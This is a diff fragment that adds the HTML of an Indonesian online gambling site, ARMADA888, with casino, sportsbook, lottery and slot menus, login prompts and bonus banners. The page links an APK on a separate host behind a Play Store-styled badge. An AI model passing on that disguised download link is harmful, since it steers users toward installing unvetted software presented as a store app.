+                      </div>
+                      <img title="Evolution" alt="Evolution" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="AFB CASINO" alt="AFB CASINO" src="https://images.linkcdn.cloud/global/navbar/casino/afc.webp" />
+                      <div class="game-name">
+                        AFB CASINO
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="PLAYACE" alt="PLAYACE" src="https://images.linkcdn.cloud/global/navbar/casino/agc.webp" />
+                      <div class="game-name">
+                        PLAYACE
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="OG Casino" alt="OG Casino" src="https://images.linkcdn.cloud/global/navbar/casino/ogs.webp" />
+                      <div class="game-name">
+                        OG Casino
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item">
+                      <a href="javascript:;">                      <img title="GD88" alt="GD88" src="https://images.linkcdn.cloud/global/navbar/casino/gd8.webp" />
+                      <div class="game-name">
+                        GD88
+                      </div>
+                      <img title="GD88" alt="GD88" class="game-maintenance" src="https://images.linkcdn.cloud/global/nav-addons/maintenance_logo.png" />
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="ALLBET" alt="ALLBET" src="https://images.linkcdn.cloud/global/navbar/casino/alb.webp" />
+                      <div class="game-name">
+                        ALLBET
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="Dream Gaming" alt="Dream Gaming" src="https://images.linkcdn.cloud/global/navbar/casino/drg.webp" />
+                      <div class="game-name">
+                        Dream Gaming
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="AI CASINO" alt="AI CASINO" src="https://images.linkcdn.cloud/global/navbar/casino/aic.webp" />
+                      <div class="game-name">
+                        AI CASINO
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item">
+                      <a href="javascript:;">                      <img title="LG88" alt="LG88" src="https://images.linkcdn.cloud/global/navbar/casino/lg8.webp" />
+                      <div class="game-name">
+                        LG88
+                      </div>
+                      <img title="LG88" alt="LG88" class="game-maintenance" src="https://images.linkcdn.cloud/global/nav-addons/maintenance_logo.png" />
+</a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="nav-item">
+                <a href="javascript:;" class="nav-link" onclick="routeNav(&#39;/sportsbook&#39;)" style="cursor: pointer;">                Sportsbook
+                <i class="fas fa-caret-down"></i>
+</a>
+                <div class="nav-item__game">
+                  <div class="container text-center justify-content-center">
+                    <div class="game-item ">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="AFB88" alt="AFB88" src="https://images.linkcdn.cloud/global/navbar/sportbook/afb.webp" />
+                      <div class="game-name">
+                        AFB88
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="BTI Sportsbook" alt="BTI Sportsbook" src="https://images.linkcdn.cloud/global/navbar/sportbook/bti.webp" />
+                      <div class="game-name">
+                        BTI Sportsbook
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="SBO SPORT" alt="SBO SPORT" src="https://images.linkcdn.cloud/global/navbar/sportbook/sbo.webp" />
+                      <div class="game-name">
+                        SBO SPORT
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="CMD368" alt="CMD368" src="https://images.linkcdn.cloud/global/navbar/sportbook/cmd.webp" />
+                      <div class="game-name">
+                        CMD368
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="SABA SPORT" alt="SABA SPORT" src="https://images.linkcdn.cloud/global/navbar/sportbook/sab.webp" />
+                      <div class="game-name">
+                        SABA SPORT
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="OPUS Sports" alt="OPUS Sports" src="https://images.linkcdn.cloud/global/navbar/sportbook/m88.webp" />
+                      <div class="game-name">
+                        OPUS Sports
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="IA E-SPORT" alt="IA E-SPORT" src="https://images.linkcdn.cloud/global/navbar/sportbook/iae.webp" />
+                      <div class="game-name">
+                        IA E-SPORT
+                      </div>
+</a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="nav-item">
+                <a href="javascript:;" class="nav-link" onclick="routeNav(&#39;/lottery&#39;)" style="cursor: pointer;">                Lottery
+                <i class="fas fa-caret-down"></i>
+</a>
+                <div class="nav-item__game">
+                  <div class="container text-center justify-content-center">
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/lottery/4d&#39;)" href="javascript:;">                      <img title="4D" alt="4D" src="https://images.linkcdn.cloud/global/navbar/lottery/togel.webp" />
+                      <div class="game-name">
+                        4D
+                      </div>
+</a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="nav-item">
+                <a href="javascript:;" class="nav-link" onclick="routeNav(&#39;/poker&#39;)" style="cursor: pointer;">                Poker
+                <i class="fas fa-caret-down"></i>
+</a>
+                <div class="nav-item__game">
+                  <div class="container text-center justify-content-center">
+                    <div class="game-item ">
+                      <a href="javascript:;" onclick="gameAlert()">                      <img title="We1Poker" alt="We1Poker" src="https://images.linkcdn.cloud/global/navbar/poker/we1.webp" />
+                      <div class="game-name">
+                        We1Poker
+                      </div>
+</a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="nav-item">
+                <a href="javascript:;" class="nav-link" onclick="routeNav(&#39;/arcade&#39;)" style="cursor: pointer;">                Arcade
+                <i class="fas fa-caret-down"></i>
+</a>
+                <div class="nav-item__game">
+                  <div class="container text-center justify-content-center">
+                    <div class="game-item game-item-new">
+                      <a onclick="routeNav(&#39;/casino/spaceman&#39;)" href="javascript:;">                      <img title="Pragmatic Crash Game" alt="Pragmatic Crash Game" src="https://images.linkcdn.cloud/global/navbar/casino/spa.webp" />
+                      <div class="game-name">
+                        Pragmatic Crash Game
+                      </div>
+                      <img title="Pragmatic Crash Game" alt="Pragmatic Crash Game" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/arcade/funkygames&#39;)" href="javascript:;">                      <img title="FUNKY GAMES" alt="FUNKY GAMES" src="https://images.linkcdn.cloud/global/navbar/slots/fun.webp" />
+                      <div class="game-name">
+                        FUNKY GAMES
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item game-item-new">
+                      <a onclick="routeNav(&#39;/arcade/joker&#39;)" href="javascript:;">                      <img title="Joker Gaming" alt="Joker Gaming" src="https://images.linkcdn.cloud/global/navbar/fishing/jok.webp" />
+                      <div class="game-name">
+                        Joker Gaming
+                      </div>
+                      <img title="Joker Gaming" alt="Joker Gaming" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/arcade/spribe&#39;)" href="javascript:;">                      <img title="SPRIBE" alt="SPRIBE" src="https://images.linkcdn.cloud/global/navbar/slots/spr.webp" />
+                      <div class="game-name">
+                        SPRIBE
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item game-item-new">
+                      <a onclick="routeNav(&#39;/arcade/fastspin&#39;)" href="javascript:;">                      <img title="Fastspin" alt="Fastspin" src="https://images.linkcdn.cloud/global/navbar/slots/fsp.webp" />
+                      <div class="game-name">
+                        Fastspin
+                      </div>
+                      <img title="Fastspin" alt="Fastspin" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/arcade/jdb&#39;)" href="javascript:;">                      <img title="JDB" alt="JDB" src="https://images.linkcdn.cloud/global/navbar/slots/jdb.webp" />
+                      <div class="game-name">
+                        JDB
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/arcade/jili&#39;)" href="javascript:;">                      <img title="JILI" alt="JILI" src=" https://images.linkcdn.cloud/global/navbar/slots/jli.webp " />
+                      <div class="game-name">
+                        JILI
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/arcade/wonwon&#39;)" href="javascript:;">                      <img title="WONWON" alt="WONWON" src=" https://images.linkcdn.cloud/global/navbar/slots/won.webp " />
+                      <div class="game-name">
+                        WONWON
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/arcade/fachai&#39;)" href="javascript:;">                      <img title="Fa Chai" alt="Fa Chai" src="https://images.linkcdn.cloud/global/navbar/slots/fac.webp" />
+                      <div class="game-name">
+                        Fa Chai
+                      </div>
+</a>
+                    </div>
+                    <div class="game-item game-item-new">
+                      <a onclick="routeNav(&#39;/arcade/spade&#39;)" href="javascript:;">                      <img title="Spade Gaming" alt="Spade Gaming" src="https://images.linkcdn.cloud/global/navbar/fishing/spd.webp" />
+                      <div class="game-name">
+                        Spade Gaming
+                      </div>
+                      <img title="Spade Gaming" alt="Spade Gaming" class="game-new" src="https://images.linkcdn.cloud/global/nav-addons/promo.webp" />
+</a>
+                    </div>
+                    <div class="game-item ">
+                      <a onclick="routeNav(&#39;/arcade/hg5&#39;)" href="javascript:;">                      <img title="HG5" alt="HG5" src="https://images.linkcdn.cloud/global/navbar/slots/hg5.webp" />
+                      <div class="game-name">
+                        HG5
+                      </div>
+</a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="nav-item">
+                <a class="nav-link" href="javascript:;" onclick="routeNav(&#39;/news&#39;)">                Berita
+</a>
+              </div>
+              <div class="nav-item">
+                <a class="nav-link" href="javascript:;" onclick="routeNav(&#39;/promotion&#39;)">                Promosi
+</a>
+              </div>
+              <div class="nav-item">
+                <a class="nav-link" href="https://18xarmada888.shop/event">                <img src="https://images.linkcdn.cloud/global/nav-addons/event.webp" alt="Event" width="70px" height="21.5px" />
+</a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav>
+    </div>
+    <div class="header-mobile">
+      <div class="header-mobile__top">
+        <div class="mobile-logo">
+          <a href="https://18xarmada888.shop">          <img src="https://images.linkcdn.cloud/V2/433/logo/logo-1810516806.webp" alt="WebsiteLogo" width="125" height="27" />
+</a>
+        </div>
+        <div class="mobile-button">
+          <a class="mobile-button--register" href="https://18xarmada888.shop/register">          Daftar
+</a>
+          <div data-target="slide-out" class="mobile-button--menu sidenav-toggle">
+            <i class="fas fa-bars"></i>
+          </div>
+        </div>
+      </div>
+      <div class="header-mobile__marquee">
+        <i class="fas fa-bullhorn"></i>
+        <marquee class="marquee">
+          ARMADA888 AGEN MPO RESMI &amp; TERPERCAYA | JACKPOT BERAPAPUN DIBAYAR LUNAS | SISTEM AMAN &amp; CEPAT
+        </marquee>
+        <a href="https://18xarmada888.shop/event" style="line-height: 0;">        <img class="pr-2" src="https://images.linkcdn.cloud/global/nav-addons/event.webp" alt="Event" width="85px" height="23.7px" />
+</a>
+      </div>
+      <div id="mobilePageLoadingBar" class="progress-bar progress-bar-success" role="progressbar" style="height:4px;width:1%;position:absolute;z-index:999;display:none;">
+      </div>
+    </div>
+    <div id="overlay">
+    </div>
+    <div class="sidenav">
+      <div class="sidenav__header">
+        <div class="sidenav__header-user">
+          <span>          Selamat Datang
+</span>
+        </div>
+        <div class="sidenav__header-logo">
+          <img src="https://images.linkcdn.cloud/V2/433/logo/logo-1810516806.webp" alt="WebsiteLogo" width="180" height="39" />
+        </div>
+        <div class="sidenav__header-button">
+          <div class="sidenav-button-title">
+            Silakan Login atau Mendaftar
+          </div>
+          <div class="sidenav-button">
+            <button class="btn-login sidenav-login" type="button" type="button" data-toggle="modal" data-target="#loginModal">
+              Masuk
+            </button>
+            <button class="btn-register" onclick="window.location.href = &#39;https://18xarmada888.shop/register&#39;">
+              Daftar
+            </button>
+          </div>
+          <div class="sidenav-password">
+            <a class="" href="https://18xarmada888.shop/forgot-password">            Lupa Password?
+</a>
+          </div>
+        </div>
+      </div>
+      <div class="sidenav__list">
+        <ul>
+          <li class="active">
+            <a href="https://18xarmada888.shop">            <i class="fas fa-home"></i>
+            <span>            Home
+</span>
+</a>
+          </li>
+          <li class="">
+            <a href="javascript:;" onclick="routeNav(&#39;/promotion&#39;)">            <i class="fas fa-percentage"></i>
+            <span>            Promosi
+</span>
+</a>
+          </li>
+          <li>
+            <a href="https://bright.moonlightcodex.us/ARMADA888.apk" target="_blank">            <i class="fas fa-download"></i>
+            <span>            Download Aplikasi
+</span>
+</a>
+          </li>
+          <li class="">
+            <a href="javascript:;" onclick="routeNav(&#39;/news&#39;)">            <i class="fas fa-newspaper"></i>
+            <span>            Berita
+</span>
+</a>
+          </li>
+          <li class="">
+            <a href="javascript:;" onclick="routeNav(&#39;/lottery/4d&#39;)">            <i class="fas fa-dice-five"></i>
+            <span>            Informasi Keluaran
+</span>
+</a>
+          </li>
+          <li class="">
+            <a href="https://18xarmada888.shop/help">            <i class="fas fa-question-circle"></i>
+            <span>            Bantuan
+</span>
+</a>
+          </li>
+          <li>
+            <a href="/contact">            <i class="fas fa-phone-alt"></i>
+            <span>            Kontak Kami
+</span>
+</a>
+          </li>
+          <li class="">
+            <a href="https://18xarmada888.shop/event">            <i class="fas fa-trophy"></i>
+            <span>            Event
+</span>
+</a>
+          </li>
+        </ul>
+      </div>
+      <div id="header-currency" class="header-flag">
+        <span>        Rupiah
+</span>
+        <i class="fas fa-caret-down"></i>
+        <div id="currency-dropdown" class="flag-dropdown">
+          <a href="https://armada888utama.click">          <div class="flag-item">
+            <span>            IDR
+</span>
+            <span>            Rupiah
+</span>
+          </div>
+</a>
+        </div>
+      </div>
+      <div id="header-lang" class="header-flag">
+        <img src="https://images.linkcdn.cloud/global/default/icon/lang/indonesia.png" width="20" height="14" alt="id" />
+        <i class="fas fa-caret-down"></i>
+        <div id="lang-dropdown" class="flag-dropdown">
+          <a href="javascript:;" data-locale="en" name="locale-switch">          <div class="flag-item">
+            <img src="https://images.linkcdn.cloud/global/default/icon/lang/english.png" alt="en" />
+            <span>            English
+</span>
+          </div>
+</a>
+          <a href="javascript:;" data-locale="id" name="locale-switch">          <div class="flag-item">
+            <img src="https://images.linkcdn.cloud/global/default/icon/lang/indonesia.png" alt="id" />
+            <span>            Indonesia
+</span>
+          </div>
+</a>
+          <a href="javascript:;" data-locale="th" name="locale-switch">          <div class="flag-item">
+            <img src="https://images.linkcdn.cloud/global/default/icon/lang/thai.png" alt="th" />
+            <span>            Thailand
+</span>
+          </div>
+</a>
+          <a href="javascript:;" data-locale="vn" name="locale-switch">          <div class="flag-item">
+            <img src="https://images.linkcdn.cloud/global/default/icon/lang/vietnam.png" alt="vn" />
+            <span>            Viet
+</span>
+          </div>
+</a>
+          <a href="javascript:;" data-locale="kh" name="locale-switch">          <div class="flag-item">
+            <img src="https://images.linkcdn.cloud/global/default/icon/lang/cambodia.png" alt="kh" />
+            <span>            Khmer
+</span>
+          </div>
+</a>
+          <a href="javascript:;" data-locale="cn" name="locale-switch">          <div class="flag-item">
+            <img src="https://images.linkcdn.cloud/global/default/icon/lang/chinese.png" alt="cn" />
+            <span>            Chinese
+</span>
+          </div>
+</a>
+          <a href="javascript:;" data-locale="tl" name="locale-switch">          <div class="flag-item">
+            <img src="https://images.linkcdn.cloud/global/default/icon/lang/philippines.png" alt="tl" />
+            <span>            Tagalog
+</span>
+          </div>
+</a>
+        </div>
+      </div>
+    </div>
+    <!-- Account Balance -->
+    <main id="main-route">
+      <div class="main-content home">
+        <section class="home__slider">
+          <div class="swiper-container main-slider">
+            <div class="swiper-wrapper">
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00433/banner/id/selamat-datang-di-armada888-698fe142786c1.webp" data-alt="" width="1120" height="250" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00433/banner/id/bonus-new-member-50-698fe16a179b2.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00433/banner/id/bonus-deposit-harian-20-698fe18f17d7e.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00433/banner/id/cashback-10-khusus-aplikasi-joker-698fe1af874ed.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00433/banner/id/deposit-pulsa-tanpa-potongan-698fe1c6d971b.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00433/banner/id/bonus-referral-698fe1dd9984a.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00433/banner/id/diskon-togel-66-698fe1eca4d1a.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00000/banner/id/joker-grand-jackpot-money-meteor-66e53696293e6.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00000/banner/id/event-afb-free-exemption-ggr-14-feb-31-march-2026-698ea088799cb.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00000/banner/id/sexy-gaming-banner-3-month-start-from-november-2025-until-march-2026-690c6efc849ec.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00000/banner/id/mg-cluckin-sweet-fest-25-feb-2026-12-mar-2026-699edd2dbf82c.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00000/banner/id/event-spadegaming-fishing-frenzy-start-from-23-feb-2026-until-26-may-2026-6995990072322.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00000/banner/id/event-spadegaming-play-win-tournament-date-start-23-feb-2026-hingga-25-mei-2026-699437525a42f.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00000/banner/id/event-pragmatic-play-thr-gajian-heboh-start-24-january-2026-hingga-23-mar-2026-698eb3c2831c4.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00000/banner/id/event-gbgame-jutaan-amplop-merah-setiap-hari-02-feb-27-feb-2026-6971e02aca6d2.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00000/banner/id/event-microgaming-live-casino-grand-prosperity-tournament-date-12-feb-04-mar-2026-698af5b487263.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00000/banner/id/event-wonwon-olympus-8000-200-power-boost-mulai-dari-12-februari-2026-hingga-03-maret-69858d6768d05.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00000/banner/id/event-pragmatic-play-daily-wins-mega-gacor-level-11-start-02-february-2026-hingga-01-march-2026-697206607696b.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00000/banner/id/event-joker-mystic-champion-mulai-19-feb-2026-hingga-26-feb-2026-6995a80943468.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00000/banner/id/event-fastspin-race-for-the-champion-start-from-19-january-04-may-2026-696887a1c0682.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00000/banner/id/event-evolution-bet-win-05jan-29mar-2026-69577a0f0da70.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00000/banner/id/event-evolution-casino-lucky-horse-cash-rain-tanggal-02-februari-sampai-01-maret-2026-697ae91196d40.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00000/banner/id/event-fastspin-keberuntungan-imlek-kuda-emas-start-01-februari-2026-hingga-28-februari-2026-697066c331372.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+              <div class="swiper-slide">
+                <a href="#">                <img src="https://images.linkcdn.cloud/V2/00000/banner/id/event-microgaming-royal-ramadan-riches-tanggal-17-februari-31-maret-2026-6991b6e2cec70.webp" data-alt="" width="1120" height="250" loading="lazy" />
+</a>
+              </div>
+            </div>
+            <div class="swiper-pagination">
+            </div>
+            <div class="swiper-button-next">
+            </div>
+            <div class="swiper-button-prev">
+            </div>
+          </div>
+        </section>
+        <section class="home__jackpot">
+          <div class="container">
+            <div class="jackpot-gif">
+              <div class="jackpot-amount">
+                IDR
+                <span id="amount"></span>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="home__menu">
+          <div class="container">
+            <div class="menu-container">
+              <div class="download-border item-download">
+                <div class="menu-download">
+                  <img id="template-download" src="https://18xarmada888.shop/../../custom/img/header/gameapp.png" width="226" height="226" alt="game app" />
+                  <h4>
+                    DOWNLOAD SEKARANG
+                  </h4>
+                  <div class="download-button">
+                    <div class="download-item">
+                      <a href="https://bright.moonlightcodex.us/ARMADA888.apk" target="_blank">                      <img src="https://18xarmada888.shop/../../custom/img/header/playstore.png" width="130" height="39" alt="playstore" />
+</a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="menu-right item-right">
+                <div class="menu-games">
+                  <a href="javascript:;" onclick="routeNav(&#39;/sportsbook&#39;)">                  <div class="games-item">
+                    <img id="template-image" src="https://18xarmada888.shop/../../custom/img/header/sports_1.png" width="193" height="150" alt="sportsbook" />
+                    <div class="games-border">
+                      <div class="games-name">
+                        SPORTSBOOK
+                      </div>
+                    </div>
+                  </div>
+</a>
+                  <a href="javascript:;" onclick="routeNav(&#39;/slot&#39;)">                  <div class="games-item">
+                    <img id="template-image" src="https://18xarmada888.shop/../../custom/img/header/slots_1.png" width="193" height="150" alt="slot" />
+                    <div class="games-border">
+                      <div class="games-name">
+                        SLOT
+                      </div>
+                    </div>
+                  </div>
+</a>
+                  <a href="javascript:;" onclick="routeNav(&#39;/casino&#39;)">                  <div class="games-item">
+                    <img id="template-image" src="https://18xarmada888.shop/../../custom/img/header/casino_1.png" width="193" height="150" alt="casino" />
+                    <div class="games-border">
+                      <div class="games-name">
+                        CASINO
+                      </div>
+                    </div>
+                  </div>
+</a>
+                  <a href="javascript:;" onclick="routeNav(&#39;/lottery&#39;)">                  <div class="games-item">
+                    <img id="template-image" src="https://18xarmada888.shop/../../custom/img/header/lottery_1.png" width="193" height="150" alt="lottery" />
+                    <div class="games-border">
+                      <div class="games-name">
+                        LOTTERY
+                      </div>
+                    </div>
+                  </div>
+</a>
+                </div>
+                <div class="menu-slider">
+                  <div class="row">
+                    <div class="col-lg-4 col-md-6">
+                      <div class="slider-cstmr swiper-container">
+                        <div class="swiper-wrapper">
+                          <div class="swiper-slide">
+                            <div class="slider-cstmr__holder cstmr-service">
+                              <div class="slider-cstmr-title">
+                                Layanan Customer
+                              </div>
+                            </div>
+                          </div>
+                          <div class="swiper-slide">
+                            <div class="slider-cstmr__holder service-game">
+                              <div class="slider-cstmr-title">
+                                Layanan Product
+                              </div>
+                              <div class="service-item">
+                                <div class="service-icon">
+                                  <img src="https://images.linkcdn.cloud/global/default/contact/vider.png" />
+                                </div>
+                                <div class="service-item-desc">
+                                  Permainan Terlengkap dalam seluruh platform
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <!-- Add Paginaton -->
+                        <div class="swiper-pagination">
+                        </div>
+                      </div>
+                    </div>
+                    <div class="col-lg-4 col-md-6">
+                      <div class="slider-provider">
+                        <div class="slider-provider-title">
+                          Game Favorit
+                        </div>
+                        <div class="slide-game-favorit swiper-container">
+                          <div class="swiper-wrapper">
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/nex/sHG0002.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/playstar/PSS-ON-00172.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/afg/pirateKingRiches.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/pragmaticplay/vs20olympx.png" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/popular-games/mahjong-ways.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/afg/mewtwosRevengeEvolution.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/advantplay/10079.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/microgaming/SMG_mPOLuckyTwinsWilds.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/playstar/PSS-ON-00171.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/playtech/gpas_mhmac_pop.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/afg/superDouble.png" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/bes/be037.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-favorit/populer/S-RH02.jpg" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/nex/sProsSnake.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/afg/pegasusBlessing.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/advantplay/10075.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/nex/sHG0005.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/afg/olympianZeusUltra.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/cq9/181.webp" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/bes/be011.jpg" width="193" height="150" />
+</a>
+                            <a class="swiper-slide" href="javascript:;" onclick="gameAlert()">                            <img loading="lazy" src="https://images.linkcdn.cloud/global/game-list/slot/microgaming/SMG_bassCatchSuperUp.webp" width="193" height="150" />
+</a>
